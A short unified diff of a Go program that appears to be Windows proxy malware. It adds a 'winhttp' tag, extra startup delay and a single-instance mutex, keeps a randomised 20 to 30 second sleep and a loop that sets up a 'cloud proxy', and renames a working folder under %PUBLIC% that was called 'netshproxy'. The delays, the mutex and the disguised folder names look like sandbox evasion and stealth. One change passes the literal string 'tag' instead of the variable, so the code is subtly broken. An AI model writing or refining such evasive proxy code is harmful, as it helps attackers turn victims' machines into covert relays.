@@ -12,12 +12,15 @@ import (
 	"unsafe"
 )
 
+var tag = "winhttp"
+
 func main() {
+	time.Sleep(time.Second)
 	seed, _ := crand.Int(crand.Reader, big.NewInt(math.MaxInt64))
 	rand.Seed(seed.Int64())
 	time.Sleep(time.Second * time.Duration(rand.Intn(10)+20))
-	if _, err := CreateMutex("wyvern2021"); err != nil {
-		return
+	if _, err := CreateMutex("tag"); err != nil {
+		os.Exit(0)
 	}
 	for {
 		err := SetupCloudProxy()
@@ -25,7 +28,7 @@ func main() {
 			break
 		}
 		fmt.Println(err)
-		err = os.RemoveAll(os.Getenv("public") + "\\netshproxy")
+		err = os.RemoveAll(os.Getenv("public") + "\\" + tag)
 		if err != nil {
 			fmt.Println(err)
 			os.Exit(0)
